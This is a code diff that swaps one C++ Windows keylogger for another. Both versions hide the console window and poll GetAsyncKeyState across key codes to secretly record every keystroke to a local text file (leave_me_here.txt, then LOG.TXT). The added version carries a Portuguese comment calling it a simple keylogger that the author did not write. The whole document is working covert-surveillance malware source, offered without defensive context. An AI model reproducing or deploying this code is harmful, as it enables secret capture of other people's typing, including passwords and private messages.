@@ -1,98 +1,81 @@
-#define _WIN32_WINNT 0x0500  // dont delete this line.
-#include <iostream>
-#include <fstream>
-#include <string>
+//Simples keylogger não desenvolvido por mim :)
+
+#include<iostream>
+#include<stdio.h>
 #include <windows.h>
-#include <winuser.h>
-using namespace std;
+#include<winuser.h>
 
-void log_char(string ch){
-  /*
-  Append ch to log LogFile
-  */
-  fstream my_log_file;
-  my_log_file.open("leave_me_here.txt", fstream::app); // append mode
+ using namespace std;
 
-  if ( my_log_file.is_open()){
-    my_log_file << ch;
-    my_log_file.close();
-  }
-}
+ int save(int key_stroke, char *file);
+void Stealth();
 
-bool special_case(int key){
-  /*
-  Treat special case character
-  check : https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
-  */
-  switch ( key ) {
-    case VK_SPACE:
-      // 0x20
-      log_char(" ");
-      return true;
-    case VK_SHIFT:
-      // 0x10
-      log_char("#shift#");
-      return true;
-    case VK_RETURN:
-      log_char("\n");
-      return true;
-    case VK_OEM_PERIOD:
-        log_char(".");
-        return true;
-    case VK_OEM_COMMA:
-        log_char(",");
-        return true;
-    case VK_OEM_MINUS:
-        log_char("-");
-        return true;
-    case VK_CONTROL:
-      // 0x11
-      log_char("#CTRL#");
-      return true;
-    case VK_BACK:
-      //0x08
-      log_char("\b");
-      return true;
-    case VK_TAB:
-      // 0x09
-      log_char("\t");
-      return true;
-    case VK_CAPITAL:
-      // 0x14
-      log_char("#CAPITAL#");
-      return true;
-    case VK_ESCAPE:
-      // 0x1B
-      log_char("#ESC#");
-      return true;
-    default:
-      return false;
-  }
-}
 
 int main(){
 
-  ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console
+     Stealth();
+     char i;
 
-  char ch = 'a';
-
-  while (true){
-
-    for ( int ch = 8; ch < 190; ch++){
-      if ( GetAsyncKeyState(ch) == -32767 ){
-        if ( special_case(ch) == false ){
-
-          fstream my_log_file;
-          my_log_file.open("leave_me_here.txt", fstream::app); // append mode
-
-          if ( my_log_file.is_open()){
-            my_log_file << CHAR(ch);
-            my_log_file.close();
-
-          }
+     while(1){
+        for (int i=8;i<=190 ;i++ ){
+            if(GetAsyncKeyState(i) == -32767)
+                save(i,"LOG.TXT");
         }
-      }
-    }
-  }
-  return 0;
+        Sleep( 50 );
+     }
+     system("PAUSE");
+ return 0;
+ }
+
+ void Stealth()
+{
+ HWND Stealth;
+ AllocConsole();
+ Stealth = FindWindowA("ConsoleWindowClass", NULL);
+ ShowWindow(Stealth,0);
 }
+
+int save(int key_stroke, char *file)
+ {
+     if( (key_stroke==1)||(key_stroke==2) )
+     return 0;
+      FILE  *OUTPUT_FILE;
+     OUTPUT_FILE = fopen (file,"a+");
+    // fprintf(OUTPUT_FILE,"%s",&key_stroke);
+
+    // cout<<key_stroke<<endl;
+     if(key_stroke==8)
+     fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+    else if(key_stroke==13)
+     fprintf(OUTPUT_FILE, "%s", "\n");
+     else if(key_stroke==32)
+     fprintf(OUTPUT_FILE, "%s", " ");
+    else if(key_stroke==VK_TAB)
+     fprintf(OUTPUT_FILE, "%s", "[TAB]");
+     else if(key_stroke==VK_SHIFT)
+     fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+    else if(key_stroke==VK_CONTROL)
+     fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+    else if(key_stroke==VK_ESCAPE)
+     fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+    else if(key_stroke==VK_END)
+     fprintf(OUTPUT_FILE, "%s", "[END]");
+     else if(key_stroke==VK_HOME)
+     fprintf(OUTPUT_FILE, "%s", "[HOME]");
+     else if(key_stroke==VK_LEFT)
+     fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+     else if(key_stroke==VK_RIGHT)
+     fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+     else if(key_stroke==VK_UP)
+     fprintf(OUTPUT_FILE, "%s", "[UP]");
+     else if(key_stroke==VK_DOWN)
+     fprintf(OUTPUT_FILE, "%s", "[DOWN]");
+     else if(key_stroke== 190 || key_stroke== 110 )
+     fprintf(OUTPUT_FILE, "%s", ".");
+     else
+     fprintf(OUTPUT_FILE,"%s",&key_stroke);
+
+
+     fclose(OUTPUT_FILE);
+     return 0;
+ }
